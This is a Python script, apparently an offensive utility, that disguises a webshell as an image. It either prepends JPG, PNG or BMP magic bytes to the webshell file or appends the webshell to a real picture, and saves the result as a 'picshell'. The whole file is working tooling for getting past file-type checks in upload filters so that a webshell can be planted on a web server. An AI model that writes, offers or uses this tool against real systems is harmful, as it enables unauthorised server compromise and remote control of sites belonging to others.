#encoding:utf-8

import argparse

pictypes = {'jpg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00','png':b'\x89PNG\x0d\x0a\x1a\x0a','bmp':b'BM'}

def usetype(pictype,webshell,saveshell):
    data = pictypes[pictype]
    with open(webshell,"rb") as f:
        data = data + f.read()
    with open(saveshell,"wb") as f:
        f.write(data)
        print("saved in "+saveshell)

def usefile(pic,webshell,saveshell):
    with open(pic,"rb") as f:
        data = f.read()
    with open(webshell,"rb") as f:
        data = data + f.read()
    with open(saveshell,"wb") as f:
        f.write(data)
        print("saved in "+saveshell)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--type",help="type of picture",choices=['jpg', 'png', 'bmp'])
    parser.add_argument("-i","--image",help="filename of image")
    parser.add_argument("-s","--shell",help="filename of webshell",required=True)
    parser.add_argument("-o","--output",help="filename of picshell",required=True)
    args = parser.parse_args()
    if args.image == None and args.type == None:
        print("Need set -t or -i")
        exit()
    if args.type != None:
        usetype(args.type,args.shell,args.output)
    else:
        usefile(args.image,args.shell,args.output)

if __name__ == "__main__":
    main()